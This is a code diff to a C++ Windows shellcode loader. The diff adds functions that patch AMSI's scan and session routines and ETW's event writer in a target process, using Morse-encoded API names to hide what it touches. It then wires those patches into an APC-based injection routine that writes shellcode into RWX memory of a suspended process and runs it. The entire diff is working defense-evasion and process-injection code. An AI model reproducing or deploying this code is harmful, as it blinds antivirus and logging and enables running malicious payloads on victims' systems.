@@ -63,6 +63,64 @@ DWORD get_PPID() {
     return process.th32ProcessID;
 }
 
+//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
+void patchAMSI(OUT HANDLE& hProc) {
+
+    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. -.. .-.. .-..").c_str());
+    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-.").c_str());
+    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);
+
+    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
+
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* amsiAddr_bk = amsiAddr;
+
+
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched amsi!\n";
+}
+
+//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
+void patchAMSIOpenSession(OUT HANDLE& hProc) {
+
+    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. -.. .-.. .-..").c_str());
+    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^--- .--. . -. ^... . ... ... .. --- -.").c_str());
+    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);
+
+    char amsiPatch[] = { 0x48, 0x31, 0xC0 };
+
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* amsiAddr_bk = amsiAddr;
+
+
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched amsi open session!\n";
+}
+
+//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
+void patchETW(OUT HANDLE& hProc) {
+    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. -.. .-.. .-..").c_str());
+    LPSTR l = const_cast<char*>(translate_morse("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
+    void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);
+
+    char etwPatch[] = { 0xC3 };
+
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* etwAddr_bk = etwAddr;
+    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched etw!\n";
+
+}
+
 //reffered to alaris
 void howlow_sc(std::vector<byte> recovered)
 {
@@ -72,6 +130,7 @@ void howlow_sc(std::vector<byte> recovered)
     HANDLE hProcess, hThread;
     DWORD pid;
     DWORD bytesWritten;
+    PULONG dwOld = 0;
 
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
@@ -118,8 +177,18 @@ void howlow_sc(std::vector<byte> recovered)
 
     mem = nullptr;
     SIZE_T p_size = recovered.size();
+
+    //patch AMSI and ETW before anything else
+    patchAMSI(hProcess);
+    patchAMSIOpenSession(hProcess);
+    patchETW(hProcess);
+
     NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    std::cout << "Written to " << mem << std::endl;
     NtWriteVirtualMemory(hProcess, mem, recovered.data(), recovered.size(), 0);
+    // will be implemented soon
+    // VirtualProtect(mem, (size_t)p_size, 0x20, MEM_COMMIT | MEM_RESERVE);
+    //NTSTATUS NTPVM = NtProtectVirtualMemory(hProcess, &mem , (PSIZE_T)&p_size, 0x20, dwOld, &dwOld);
     NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
     NtResumeThread(hThread, NULL);
 
